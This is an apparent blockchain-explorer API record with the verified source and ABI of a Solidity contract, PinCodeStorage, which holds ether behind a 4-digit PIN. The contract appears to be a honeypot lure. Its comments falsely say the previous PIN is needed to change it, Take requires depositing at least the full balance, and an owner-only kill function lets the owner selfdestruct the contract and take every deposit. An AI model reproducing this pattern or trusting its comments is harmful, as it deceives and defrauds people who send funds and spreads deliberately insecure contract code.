{"status":"1","message":"OK","result":[{"SourceCode":"contract PinCodeStorage {\r\n\t// Store some money with 4 digit pincode\r\n\t\r\n    address Owner = msg.sender;\r\n    uint PinCode;\r\n\r\n    function() public payable {}\r\n    function PinCodeStorage() public payable {}\r\n   \r\n    function setPinCode(uint p) public payable{\r\n        //To set Pin you need to know the previous one and it has to be bigger than 1111\r\n        if (p>1111 || PinCode == p){\r\n            PinCode=p;\r\n        }\r\n    }\r\n    \r\n    function Take(uint n) public payable {\r\n\t\tif(msg.value >= this.balance && msg.value > 0.1 ether)\r\n\t\t\t// To prevent random guesses, you have to send some money\r\n\t\t\t// Random Guess = money lost\r\n\t\t\tif(n <= 9999 && n == PinCode)\r\n\t\t\t\tmsg.sender.transfer(this.balance+msg.value);\r\n    }\r\n    \r\n    function kill() {\r\n        require(msg.sender==Owner);\r\n        selfdestruct(msg.sender);\r\n     }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"p\",\"type\":\"uint256\"}],\"name\":\"setPinCode\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"n\",\"type\":\"uint256\"}],\"name\":\"Take\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"PinCodeStorage","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://a1e9b1735b4cb92700c3aeeb6b87d233e61656d4816f91efb17a55984aa5a2ca"}]}